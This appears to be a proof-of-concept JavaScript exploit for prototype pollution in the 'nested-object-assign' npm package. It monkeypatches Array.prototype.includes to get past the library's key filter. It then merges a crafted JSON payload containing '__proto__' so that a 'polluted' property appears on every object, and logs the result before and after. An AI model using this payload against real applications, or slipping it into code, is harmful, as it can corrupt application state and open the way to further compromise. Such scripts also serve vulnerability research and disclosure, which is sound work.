Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const assign = require('nested-object-assign');
console.log({}.polluted);
assign({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);